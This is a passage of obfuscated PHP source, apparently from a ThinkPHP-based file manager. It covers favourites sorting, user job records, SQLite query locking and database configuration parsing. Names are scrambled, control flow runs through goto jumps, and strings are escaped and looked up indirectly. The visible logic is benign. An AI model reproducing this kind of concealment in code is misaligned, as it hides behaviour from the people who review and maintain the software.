array_merge($C–ò³Ô¬†è, $FÓ£ ­±„); } return $dĞõ®ˆÉ¯; goto cÖÈ¿Ä±‚¯; cÖÈ¿Ä±‚¯: } protected function addFav($d²¡“µªÖ, $FÍìæ¦Éšš = '', $dé¢Ö‹ÙĞ = "\x73\157\165\162\x63\x65") { goto fµöÌ‹…Œ„; D§¼£Ûø¬÷: return $this->add($Bø»º²âÓƒ); goto E¦Üƒ”¤ŞÌ; då¶¼‚œ‚™: $A—ÁöĞ˜•ù = array($e–—ïääé [1414] => USER_ID, $e–—ïääé [436] => 0); $C¾ãÌãîòÎ = $this->where($A—ÁöĞ˜•ù)->max($e–—ïääé [2115]); if (!$C¾ãÌãîòÎ) { $C¾ãÌãîòÎ = 0; } goto A×¸›’ôÚ; fµöÌ‹…Œ„: $e–—ïääé  =& $_SERVER[í™]; $A—ÁöĞ˜•ù = array($e–—ïääé [1414] => USER_ID, $e–—ïääé [436] => 0, $e–—ïääé [388] => $dé¢Ö‹ÙĞ, $e–—ïääé [387] => $d²¡“µªÖ); if ($this->where($A—ÁöĞ˜•ù)->find()) { return !1; } goto då¶¼‚œ‚™; A×¸›’ôÚ: if (!$FÍìæ¦Éšš && $dé¢Ö‹ÙĞ == $e–—ïääé [382]) { $a†ƒØˆ³÷ = Model($e–—ïääé [1103])->where(array($e–—ïääé [383] => $d²¡“µªÖ))->find(); if (!$a†ƒØˆ³÷) { return !1; } $FÍìæ¦Éšš = $a†ƒØˆ³÷[$e–—ïääé [28]]; } $FÍìæ¦Éšš = $this->getAutoName($FÍìæ¦Éšš); $Bø»º²âÓƒ = array($e–—ïääé [1414] => USER_ID, $e–—ïääé [436] => 0, $e–—ïääé [386] => $FÍìæ¦Éšš, $e–—ïääé [387] => $d²¡“µªÖ, $e–—ïääé [388] => $dé¢Ö‹ÙĞ, $e–—ïääé [2098] => $C¾ãÌãîòÎ + 1); goto D§¼£Ûø¬÷; E¦Üƒ”¤ŞÌ: } protected function remove($CíùÆ”›•…) { $f¤ôâ§Ö =& $_SERVER[í™]; $AÆÂÃâÕ´¼ = array($f¤ôâ§Ö[1414] => USER_ID, $f¤ôâ§Ö[385] => $CíùÆ”›•…); return $this->where($AÆÂÃâÕ´¼)->delete(); } protected function removeByName($cßÄÔ¯å”‚) { $AĞàÁøã’¼ =& $_SERVER[í™]; $Dµã”½¸Î‡ = array($AĞàÁøã’¼[1414] => USER_ID, $AĞàÁøã’¼[386] => $cßÄÔ¯å”‚, $AĞàÁøã’¼[436] => 0); return $this->where($Dµã”½¸Î‡)->delete(); } protected function rename($FèªàÏßÁ, $AÈ‚¡ìÌ¾) { $Bƒô¿Ü³è« =& $_SERVER[í™]; if ($FèªàÏßÁ == $AÈ‚¡ìÌ¾) { return !1; } $bñª˜®† = $this->getAutoName($AÈ‚¡ìÌ¾); if ($AÈ‚¡ìÌ¾ != $bñª˜®†) { return !1; } $Aª†ŒÈÏÅƒ = array($Bƒô¿Ü³è«[1414] => USER_ID, $Bƒô¿Ü³è«[436] => 0, $Bƒô¿Ü³è«[28] => $FèªàÏßÁ); return $this->where($Aª†ŒÈÏÅƒ)->save(array($Bƒô¿Ü³è«[28] => $AÈ‚¡ìÌ¾)); } protected function resetSort($f•Ì™®×êê) { $eñ¶ŸÄ¼« =& $_SERVER[í™]; $f•Ì™®×êê = is_array($f•Ì™®×êê) ? $f•Ì™®×êê : array(); $Aæ¿©”Ÿºò = array($eñ¶ŸÄ¼«[1414] => USER_ID); for ($aãà×’˜õ— = 0; $aãà×’˜õ— < count($f•Ì™®×êê); $aãà×’˜õ—++) { $Aæ¿©”Ÿºò[$eñ¶ŸÄ¼«[385]] = $f•Ì™®×êê[$aãà×’˜õ—]; $this->where($Aæ¿©”Ÿºò)->save(array($eñ¶ŸÄ¼«[2098] => $aãà×’˜õ— + 1)); } return !0; } protected function moveTop($A„î£Š‡£) { goto d÷ ²—¦Ğê; d÷ ²—¦Ğê: $FŒÃ¯†¡ä½ =& $_SERVER[í™]; $câÈÊ¤À­¹ = array($FŒÃ¯†¡ä½[1414] => USER_ID, $FŒÃ¯†¡ä½[436] => 0); $f¸à’ğÚÔ» = $this->where($câÈÊ¤À­¹)->where(array($FŒÃ¯†¡ä½[28] => $A„î£Š‡£))->find(); goto aŸÂ‚Í»¾; aŸÂ‚Í»¾: if (!$f¸à’ğÚÔ») { return; } $F‡”Í“é¢ = $this->field($FŒÃ¯†¡ä½[367])->where($câÈÊ¤À­¹)->order($FŒÃ¯†¡ä½[2495])->select(); $F‡”Í“é¢ = array_to_keyvalue($F‡”Í“é¢, $FŒÃ¯†¡ä½[33], $FŒÃ¯†¡ä½[367]); goto BØÀŸ´Õ²Á; BØÀŸ´Õ²Á: $Fø‹²¾ƒĞ = $F‡”Í“é¢; $F‡”Í“é¢ = array_remove_value($F‡”Í“é¢, $f¸à’ğÚÔ»[$FŒÃ¯†¡ä½[367]]); array_unshift($F‡”Í“é¢, $f¸à’ğÚÔ»[$FŒÃ¯†¡ä½[367]]); goto b£”Ïà…ô; b£”Ïà…ô: return $this->resetSort($F‡”Í“é¢); goto CÒ»ÃÁÀËË; CÒ»ÃÁÀËË: } protected function moveBottom($CĞ‚ŠÑ‹á£) { $A½‚¸Â¤„´ =& $_SERVER[í™]; $Fµó“–ÍŸÛ = array($A½‚¸Â¤„´[1414] => USER_ID, $A½‚¸Â¤„´[436] => 0); $EÎ½â„íÉÂ = $this->where($Fµó“–ÍŸÛ)->max($A½‚¸Â¤„´[2115]); $Aå¨­Ò¡à = array($A½‚¸Â¤„´[2115] => $EÎ½â„íÉÂ + 1); return $this->where($Fµó“–ÍŸÛ)->where(array($A½‚¸Â¤„´[28] => $CĞ‚ŠÑ‹á£))->save($Aå¨­Ò¡à); } private function getAutoName($A²×Â–ç) { goto FõÈÍÈØ; B—Ü¹æŞ¢Ø: $F‰ì“ï´Ù‰ = array_to_keyvalue($F‰ì“ï´Ù‰, $CÏ¼óæ‘®†[33], $CÏ¼óæ‘®†[28]); if (!$F‰ì“ï´Ù‰ || !in_array($A²×Â–ç, $F‰ì“ï´Ù‰)) { return $A²×Â–ç; } for ($dŒ¦¶´µ³¦ = 0; $dŒ¦¶´µ³¦ < count($F‰ì“ï´Ù‰); $dŒ¦¶´µ³¦++) { if (!in_array($A²×Â–ç . "\x28{$dŒ¦¶´µ³¦}\x29", $F‰ì“ï´Ù‰)) { return $A²×Â–ç . "\50{$dŒ¦¶´µ³¦}\51"; } } goto Aİ¤Œå¨õ; FõÈÍÈØ: $CÏ¼óæ‘®† =& $_SERVER[í™]; $CŠÕÇ—Âïš = array($CÏ¼óæ‘®†[1414] => USER_ID, $CÏ¼óæ‘®†[436] => 0); $F‰ì“ï´Ù‰ = $this->field($CÏ¼óæ‘®†[28])->where($CŠÕÇ—Âïš)->select(); goto B—Ü¹æŞ¢Ø; Aİ¤Œå¨õ: return $A²×Â–ç . "\x28{$dŒ¦¶´µ³¦}\51"; goto AßÏ«¾Ì„; AßÏ«¾Ì„: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x6a\157\142\114\151\163\164"; public $field = array("\x6e\x61\155\145", "\x64\145\163\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\154\146\x4a\157\142\x4c\x69\163\x74"; public function listData($eŠàœÌô˜è = false, $B½í…¿êªç = "\163\x6f\x72\164", $d„‘´ˆåÜ² = false) { return parent::listData($eŠàœÌô˜è, $B½í…¿êªç, $d„‘´ˆåÜ²); } public function remove($dáê‡Í¨«„) { return parent::remove($dáê‡Í¨«„); } public function add($D§¤‘ˆ ¹ò) { $bÉæ¡Ä›×Æ =& $_SERVER[í™]; if ($this->findByName($D§¤‘ˆ ¹ò[$bÉæ¡Ä›×Æ[28]])) { return !1; } $D§¤‘ˆ ¹ò[$bÉæ¡Ä›×Æ[2115]] = $this->getSort(); return parent::insert($D§¤‘ˆ ¹ò); } private function getSort() { $E±ÎšæŸ¢ë =& $_SERVER[í™]; $bÜÓÉãñ¶ = parent::listData(); $eÛ¢òƒ‚Å = array_to_keyvalue($bÜÓÉãñ¶, $E±ÎšæŸ¢ë[33], $E±ÎšæŸ¢ë[2115]); return empty($eÛ¢òƒ‚Å) ? 0 : max($eÛ¢òƒ‚Å) + 1; } public function update($b±ÊŠÆ‚¼Ë, $C«ÊŞ¾ëÏ) { $bÆÔöÕ¸® =& $_SERVER[í™]; $b ÒßÇ‘éÑ = parent::listData($b±ÊŠÆ‚¼Ë); $aßĞ•Æ…´³ = $this->findByName($C«ÊŞ¾ëÏ[$bÆÔöÕ¸®[28]]); if (!$b ÒßÇ‘éÑ || $aßĞ•Æ…´³ && $aßĞ•Æ…´³[$bÆÔöÕ¸®[367]] != $b ÒßÇ‘éÑ[$bÆÔöÕ¸®[367]]) { return !1; } return parent::update($b±ÊŠÆ‚¼Ë, $C«ÊŞ¾ëÏ); } public function setUserJob($fÛ¬ó•ó‡ö, $cİŞŒ¬¤ì) { goto BñÓÏ¼É³; A‚¬“¤’”İ: $Bó•­¤ÑÓï = rtrim($Bó•­¤ÑÓï, $F…œ†‰ç®Š[47]); Model($F…œ†‰ç®Š[479])->metaSet($fÛ¬ó•ó‡ö, self::JOB_KEY, $Bó•­¤ÑÓï); goto CéƒÀºÎí; BñÓÏ¼É³: $F…œ†‰ç®Š =& $_SERVER[í™]; if (!is_array($cİŞŒ¬¤ì)) { $cİŞŒ¬¤ì = array($cİŞŒ¬¤ì); } $d¹·Ä·³ƒ´ = parent::listData(); goto Eš’–ƒ±ğ…; Eš’–ƒ±ğ…: $aÅ ÜÉ = array_to_keyvalue($d¹·Ä·³ƒ´, $F…œ†‰ç®Š[28]); $Bó•­¤ÑÓï = $F…œ†‰ç®Š[361]; foreach ($cİŞŒ¬¤ì as $fÈŞ–Á„¯ì) { if ($aÅ ÜÉ[$fÈŞ–Á„¯ì]) { $Bó•­¤ÑÓï .= $aÅ ÜÉ[$fÈŞ–Á„¯ì][$F…œ†‰ç®Š[367]] . $F…œ†‰ç®Š[47]; } else { $B­®¯½˜í = $this->add($fÈŞ–Á„¯ì); $Bó•­¤ÑÓï .= $B­®¯½˜í . $F…œ†‰ç®Š[47]; } } goto A‚¬“¤’”İ; CéƒÀºÎí: } public function getUserJob($E«¸î­Ô¥¶) { $C§İ“ñâ‰… = Model($_SERVER[í™][479])->metaGet($E«¸î­Ô¥¶); return $this->getUserJobInfo($C§İ“ñâ‰…[self::JOB_KEY]); } public function getUserJobInfo($CÂİ…£ÌÎ) { goto cœ½©Åí; DÙáÆÎù”‹: return $a†©è®Àù; goto b–ß°¡™¶Ü; cœ½©Åí: $Eğò¦·°‡ =& $_SERVER[í™]; $dˆµãƒÛĞè = explode($Eğò¦·°‡[47], $CÂİ…£ÌÎ); $A•¢›²Ñ = parent::listData(); goto BƒÕ½àôİ‚; BƒÕ½àôİ‚: $A•¢›²Ñ = array_remove_key($A•¢›²Ñ, $Eğò¦·°‡[187]); $a†©è®Àù = array(); foreach ($dˆµãƒÛĞè as $C™³ğ¥¾š) { if (isset($A•¢›²Ñ[$C™³ğ¥¾š])) { $a†©è®Àù[] = $A•¢›²Ñ[$C™³ğ¥¾š]; } } goto DÙáÆÎù”‹; b–ß°¡™¶Ü: } } goto b¾§›‘´ˆ¦; c¦™î­­§Õ: class DbSqlite3 extends DbSqlite3Base { public function query($BâƒêÌª’) { goto b‹ÖÔº×½¨; C„÷äÒ£Š: fclose($cøÄ™ƒ˜—Š); show_json($C‹´Âáô¢Ş[859], !1); return !1; goto DøŞÁ©´Ê¤; fæÚ½ÎÎ¿: if (!$cøÄ™ƒ˜—Š) { return !1; } if (flock($cøÄ™ƒ˜—Š, LOCK_EX)) { $D…¶Õæ¬¬Ï = parent::query($BâƒêÌª’); flock($cøÄ™ƒ˜—Š, LOCK_UN); fclose($cøÄ™ƒ˜—Š); return $D…¶Õæ¬¬Ï; } flock($cøÄ™ƒ˜—Š, LOCK_UN); goto C„÷äÒ£Š; b‹ÖÔº×½¨: $C‹´Âáô¢Ş =& $_SERVER[í™]; $CÚÌ÷’…Íî = DATA_PATH . $C‹´Âáô¢Ş[857]; $cøÄ™ƒ˜—Š = fopen($CÚÌ÷’…Íî, $C‹´Âáô¢Ş[858]); goto fæÚ½ÎÎ¿; DøŞÁ©´Ê¤: } public function execute($Aâôå‹ì¶¦) { goto Aìø«ù½Í‘; F¦¯ŞÜ÷Ì‡: if (!$f»ŠÛäÖ˜š) { return !1; } if (flock($f»ŠÛäÖ˜š, LOCK_EX)) { $C÷†¿òø… = parent::execute($Aâôå‹ì¶¦); flock($f»ŠÛäÖ˜š, LOCK_UN); fclose($f»ŠÛäÖ˜š); return $C÷†¿òø…; } flock($f»ŠÛäÖ˜š, LOCK_UN); goto fÏ×Èî²éâ; Aìø«ù½Í‘: $BÀ‹«› ì½ =& $_SERVER[í™]; $A×—ƒªŒÀ = DATA_PATH . $BÀ‹«› ì½[857]; $f»ŠÛäÖ˜š = fopen($A×—ƒªŒÀ, $BÀ‹«› ì½[858]); goto F¦¯ŞÜ÷Ì‡; fÏ×Èî²éâ: fclose($f»ŠÛäÖ˜š); show_json($BÀ‹«› ì½[859], !1); return !1; goto f‰Ã¼¯Š°¼; f‰Ã¼¯Š°¼: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\156\145\x71" => "\74\76", "\x67\164" => "\x3e", "\145\x67\164" => "\76\x3d", "\x6c\x74" => "\x3c", "\145\154\164" => "\x3c\x3d", "\x6e\x6f\164\154\x69\153\x65" => "\116\x4f\124\40\x4c\x49\113\105", "\154\x69\153\145" => "\x4c\111\x4b\105", "\151\x6e" => "\x49\116", "\156\157\164\x69\x6e" => "\116\x4f\124\x20\x49\116", "\156\x6f\x74\40\151\156" => "\116\117\x54\x20\x49\x4e", "\x62\145\164\167\x65\145\156" => "\102\x45\124\127\105\105\116", "\156\x6f\x74\142\x65\164\167\145\145\x6e" => "\116\x4f\124\x20\102\105\x54\x57\105\x45\116", "\156\x6f\164\x20\x62\145\x74\167\x65\x65\x6e" => "\116\117\x54\40\x42\105\124\x57\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\104\x49\123\x54\x49\x4e\x43\x54\45\40\x25\x46\x49\x45\114\x44\x25\40\x46\x52\117\x4d\x20\x25\x54\x41\x42\114\x45\45\45\x4a\x4f\111\116\45\x25\127\x48\x45\x52\x45\45\x25\x47\122\117\125\120\x25\45\x48\101\126\x49\116\x47\45\45\117\122\104\105\x52\45\x25\114\x49\x4d\111\124\45\40\x25\x55\x4e\x49\x4f\x4e\x25\45\103\x4f\115\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $F“‹¸À©Ş” = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[í™][860], $F“‹¸À©Ş”); } public function factory($FÍ¿ÈÊˆ¾İ = '') { goto F™êÃğŠÍñ; F¦ÛªÉ²Ëë: return $cÂ†‹„ŸŸ¶; goto då‘Ä¿åßÆ; F™êÃğŠÍñ: $F¸ªŒè‚æù =& $_SERVER[í™]; $FÍ¿ÈÊˆ¾İ = $this->parseConfig($FÍ¿ÈÊˆ¾İ); if (empty($FÍ¿ÈÊˆ¾İ[$F¸ªŒè‚æù[861]])) { think_exception(think_lang($F¸ªŒè‚æù[862])); } goto AÊ„Å¹ÀÆ; AÊ„Å¹ÀÆ: $this->dbType = ucwords(strtolower($FÍ¿ÈÊˆ¾İ[$F¸ªŒè‚æù[861]])); $CÌ“¿ô«ê£ = $F¸ªŒè‚æù[863] . $this->dbType; if (class_exists($CÌ“¿ô«ê£)) { $cÂ†‹„ŸŸ¶ = new $CÌ“¿ô«ê£($FÍ¿ÈÊˆ¾İ); if ($F¸ªŒè‚æù[705] != strtolower($FÍ¿ÈÊˆ¾İ[$F¸ªŒè‚æù[861]])) { $cÂ†‹„ŸŸ¶->dbType = strtoupper($this->dbType); } else { $cÂ†‹„ŸŸ¶->dbType = $this->_getDsnType($FÍ¿ÈÊˆ¾İ[$F¸ªŒè‚æù[813]]); } } else { think_exception(think_lang($F¸ªŒè‚æù[864]) . $F¸ªŒè‚æù[865] . $CÌ“¿ô«ê£); } goto F¦ÛªÉ²Ëë; då‘Ä¿åßÆ: } public function __call($A§‚îùç, $Eç£ôÉÄ§) { if (method_exists($this, $A§‚îùç)) { return call_user_func_array(array($this, $A§‚îùç), $Eç£ôÉÄ§); } } protected function _getDsnType($e¿›ÕõŠÍÁ) { $A§ÖêÉÒ = explode($_SERVER[í™][4], $e¿›ÕõŠÍÁ); $b¥èàĞØšö = strtoupper(trim($A§ÖêÉÒ[0])); return $b¥èàĞØšö; } private function parseConfig($E¢åŸƒ‚¿ = '') { $a†œ“ÖÕ–à =& $_SERVER[í™]; if (!empty($E¢åŸƒ‚¿) && is_string($E¢åŸƒ‚¿)) { $E¢åŸƒ‚¿ = $this->parseDSN($E¢åŸƒ‚¿); } elseif (is_array($E¢åŸƒ‚¿)) { $E¢åŸƒ‚¿ = array_change_key_case($E¢åŸƒ‚¿); $E¢åŸƒ‚¿ = array($a†œ“ÖÕ–à[861] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[704]], $a†œ“ÖÕ–à[786] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[866]], $a†œ“ÖÕ–à[787] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[867]], $a†œ“ÖÕ–à[784] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[868]], $a†œ“ÖÕ–à[785] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[869]], $a†œ“ÖÕ–à[17] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[870]], $a†œ“ÖÕ–à[813] => $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[706]], $a†œ“ÖÕ–à[13] => isset($E¢åŸƒ‚¿[$a†œ“ÖÕ–à[871]]) ? $E¢åŸƒ‚¿[$a†œ“ÖÕ–à[871]] : array()); } elseif (empty($E¢åŸƒ‚¿)) { if (think_config($a†œ“ÖÕ–à[872]) && $a†œ“ÖÕ–à[705] != strtolower(think_config($a†œ“ÖÕ–à[873]))) { $E¢åŸƒ‚¿ = $this->parseDSN(think_config($a†œ“ÖÕ–à[872])); } else { $E¢åŸƒ‚¿ = array($a†œ“ÖÕ–à[861] => think_config($a†œ“ÖÕ–à[873]), $a†œ“ÖÕ–à[786] => think_config($a†œ“ÖÕ–à[874]), $a†œ“ÖÕ–à[787] => think_config($a†œ“ÖÕ–à[875]), $a†œ“ÖÕ–à[784] => think_config($a†œ“ÖÕ–à[876]), $a†œ“ÖÕ–à[785] => think_config($a†œ“ÖÕ–à[877]), $a†œ“ÖÕ–à[17] => think_config($a†œ“ÖÕ–à[234]), $a†œ“ÖÕ–à[813] => think_config($a†œ“ÖÕ–à[872]), $a†œ“ÖÕ–à[13] => think_config($a†œ“ÖÕ–à[878])); } } return $E¢åŸƒ‚¿; } protected function initConnect($D’„‹´Â›™ = true) { if (1 == think_config($_SERVER[í™][18])) { $this->_linkID = $this->multiConnect($D’„‹´Â›™); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($e¿ë¾Æ°ô = false) { $aÈ˜ñ™íÈ =& $_SERVER[í™]; static $cÔ‘¶òŠÈ = array(); if (empty($cÔ‘¶òŠÈ)) { foreach ($this->config as $e„ÖØ¨ğØ => $Béäñš¹) { $cÔ‘¶òŠÈ[$e„ÖØ¨ğØ] = explode($aÈ˜ñ™íÈ[47], $Béäñš¹); } } if (think_config($aÈ˜ñ™íÈ[879])) { if ($e¿ë¾Æ°ô) { $EÔÛ•–¼ŠÖ = floor(mt_rand(0, think_config($aÈ˜ñ™íÈ[880]) - 1)); } else { if (is_numeric(think_config($aÈ˜ñ™íÈ[881]))) { $EÔÛ•–¼ŠÖ = think_config($aÈ˜ñ™íÈ[881]); } else { $EÔÛ•–¼ŠÖ = floor(mt_rand(think_config($aÈ˜ñ™íÈ[880]), count($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[784]]) - 1)); } } } else { $EÔÛ•–¼ŠÖ = floor(mt_rand(0, count($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[784]]) - 1)); } $D‘ºÂ¦Ñ÷„ = array($aÈ˜ñ™íÈ[786] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[786]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[786]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[786]][0], $aÈ˜ñ™íÈ[787] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[787]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[787]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[787]][0], $aÈ˜ñ™íÈ[784] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[784]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[784]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[784]][0], $aÈ˜ñ™íÈ[785] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[785]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[785]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[785]][0], $aÈ˜ñ™íÈ[17] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[17]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[17]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[17]][0], $aÈ˜ñ™íÈ[813] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[813]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[813]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[813]][0], $aÈ˜ñ™íÈ[13] => isset($cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[13]][$EÔÛ•–¼ŠÖ]) ? $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[13]][$EÔÛ•–¼ŠÖ] : $cÔ‘¶òŠÈ[$aÈ˜ñ™íÈ[13]][0]); return $this->connect($D‘ºÂ¦Ñ÷„, $EÔÛ•–¼ŠÖ); } public function parseDSN($A·ˆ³©àğî) { $aË“·ôŸÚƒ =& $_SERVER[í™]; if (empty($A·ˆ³©àğî)) { return !1; } $e¸¤ÚÙš‡ = parse_url($A·ˆ³©àğî); if ($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[168]]) { $bÈ°±ã™“Ä = array($aË“·ôŸÚƒ[861] => $e¸¤ÚÙš‡[$aË“·ôŸÚƒ[168]], $aË“·ôŸÚƒ[786] => isset($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[537]]) ? $e¸¤ÚÙš‡[$aË“·ôŸÚƒ[537]] : $aË“·ôŸÚƒ[33], $aË“·ôŸÚƒ[787] => isset($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[882]]) ? $e¸¤ÚÙš‡[$aË“·ôŸÚƒ[882]] : $aË“·ôŸÚƒ[33], $aË“·ôŸÚƒ[784] => isset($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[169]]) ? $e¸¤ÚÙš‡[$aË“·ôŸÚƒ[169]] : $aË“·ôŸÚƒ[33], $aË“·ôŸÚƒ[785] => isset($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[170]]) ? $e¸¤ÚÙš‡[$aË“·ôŸÚƒ[170]] : $aË“·ôŸÚƒ[33], $aË“·ôŸÚƒ[17] => isset($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[75]]) ? substr($e¸¤ÚÙš‡[$aË“·ôŸÚƒ[75]], 1) : $aË“·ôŸÚƒ[33]); } else { preg_match($aË“·ôŸÚƒ[883], trim($A·ˆ³©àğî), $a†¤¸˜ ×²); $bÈ°±ã™“Ä = array($aË“·ôŸÚƒ[861] => $a†¤¸˜ ×²[1], $aË“·ôŸÚƒ[786] => $a†¤¸˜ ×²[2], $aË“·ôŸÚƒ[787] => $a†¤¸˜ ×²[3], $aË“·ôŸÚƒ[784] => $a†¤¸˜ ×²[4], $aË“·ôŸÚƒ[785] => $a†¤¸˜ ×²[5], $aË“·ôŸÚƒ[17] => $a†¤¸˜ ×²[6]); } $bÈ°±ã™“Ä[$aË“·ôŸÚƒ[813]] = $aË“·ôŸÚƒ[33]; return $bÈ°±ã™“Ä; } protected function debug() { $C…šÊ”íÁ¾ =& $_SERVER[í™]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $C…šÊ”íÁ¾[884]; if (think_config($C…šÊ”íÁ¾[885])) { think_status($C…šÊ”íÁ¾[886]); think_trace($this->queryStr . $C…šÊ”íÁ¾[887] . think_status($C…šÊ”íÁ¾[20], $C…šÊ”íÁ¾[886], 6) . $C…šÊ”íÁ¾[888], $C…šÊ”íÁ¾[33], $C…šÊ”íÁ¾[889]); } } protected function parseLock($E´‰­¯½Î = false) { $A¬­¤•µƒ =& $_SERVER[í™]; if (!$E´‰­¯½Î) { return $A¬­¤•µƒ[33]; } if ($A¬­¤•µƒ[815] == $this->dbType) { return $A¬­¤•µƒ[890]; } return $A¬­¤•µƒ[891]; } protected function parseSet($A¶×²Â­Æ) { $aøß¶¼ñ¼ =& $_SERVER[í™]; foreach ($A¶×²Â­Æ as $c¨é—Ç ¬ => $Eèáº‡¿¹) { if (is_array($Eèáº‡¿¹) && $aøß¶¼ñ¼[285] == $Eèáº‡¿¹[0]) { $b°ÊÚßŠ¾Ù[] = $this->parseKey($c¨é—Ç ¬) . $aøß¶¼ñ¼[892] . $Eèáº‡¿¹[1]; } elseif (is_scalar($Eèáº‡¿¹) || is_null($Eèáº‡¿¹)) { $b°ÊÚßŠ¾Ù[] = $this->parseKey($c¨é—Ç ¬) . $aøß¶¼ñ¼[892] . $this->parseValue($Eèáº‡¿¹); } } return $aøß¶¼ñ¼[893] . implode($aøß¶¼ñ¼[47], $b°ÊÚßŠ¾Ù); } protected function bindParam($cæ†–ñŠø, $eçàÙò¹¾„) { $this->bind[$_SERVER[í™][4] . $cæ†–ñŠø] = $eçàÙò¹¾„; } protected function parseBind($C¡ µß»âÈ) { $C¡ µß»âÈ = array_merge($this->bind, $C¡ µß»âÈ); $this->bind = array(); return $C¡ µß»âÈ; } function parseKey(&$E©ÕµòÃÙí, $DšôÙªø› = true) { if ($DšôÙªø›) { $E©ÕµòÃÙí = $this->parseKeyCheck($E©ÕµòÃÙí); } return $E©ÕµòÃÙí; } function parseKeyCheck($cá Á›´–å) { $b´ÀâÉ¡ô =& $_SERVER[í™]; $cá Á›´–å = trim($cá Á›´–å); if (!preg_match($b´ÀâÉ¡ô[894], $cá Á›´–å)) { think_exception($b´ÀâÉ¡ô[895] . $cá Á›´–å); } return $cá Á›´–å; } protected function parseValue($AêÖêÓ¢ï×) { $Bí†…„Î˜Ò =& $_SERVER[í™]; if (is_string($AêÖêÓ¢ï×)) { $AêÖêÓ¢ï× = $Bí†…„Î˜Ò[854] . $this->escapeString($AêÖêÓ¢ï×) . $Bí†…„Î˜Ò[854]; } elseif (isset($AêÖêÓ¢ï×[0]) && is_string($AêÖêÓ¢ï×[0]) && strtolower($AêÖêÓ¢ï×[0]) == $Bí†…„Î˜Ò[285]) { $AêÖêÓ¢ï× = $this->escapeString($AêÖêÓ¢ï×[1]); } elseif (is_array($AêÖêÓ¢ï×)) { $AêÖêÓ¢ï× = array_map(array($this, $Bí†…„Î˜Ò[855]), $AêÖêÓ¢ï×); } elseif (is_bool($AêÖêÓ¢ï×)) { $AêÖêÓ¢ï× = $AêÖêÓ¢ï× ? $Bí†…„Î˜Ò[83] : $Bí†…„Î˜Ò[470]; } elseif (is_null($AêÖêÓ¢ï×)) { $AêÖêÓ¢ï× = $Bí†…„Î˜Ò[99]; } return $AêÖêÓ¢ï×; } protected function parseField($aŒÀŒÍ·ó«) { $D×±½ˆµ’ =& $_SERVER[í™]; if (is_string($aŒÀŒÍ·ó«) && strpos($aŒÀŒÍ·ó«, $D×±½ˆµ’[47])) { $aŒÀŒÍ·ó« = explode($D×±½ˆµ’[47], $aŒÀŒÍ·ó«); } if (is_array($aŒÀŒÍ·ó«)) { $b®Üù¥ˆİµ = array(); foreach ($aŒÀŒÍ·ó« as $a»¼êæ½ => $Eå…Úˆ¿) { if (!is_numeric($a»¼êæ½)) { $b®Üù¥ˆİµ[] = $this->parseKey($a»¼êæ½) . $D×±½ˆµ’[896] . $this->parseKey($Eå…Úˆ¿); } else { $b®Üù¥ˆİµ[] = $this->parseKey($Eå…Úˆ¿); } } $EŒ´©Õ¹ÔÎ = implode($D×±½ˆµ’[47], $b®Üù¥ˆİµ); } elseif (is_string($aŒÀŒÍ·ó«) && !empty($aŒÀŒÍ·ó«)) { $EŒ´©Õ¹ÔÎ = $aŒÀŒÍ·ó«; } else { $EŒ´©Õ¹ÔÎ = $D×±½ˆµ’[176]; } return $EŒ´©Õ¹ÔÎ; } protected function 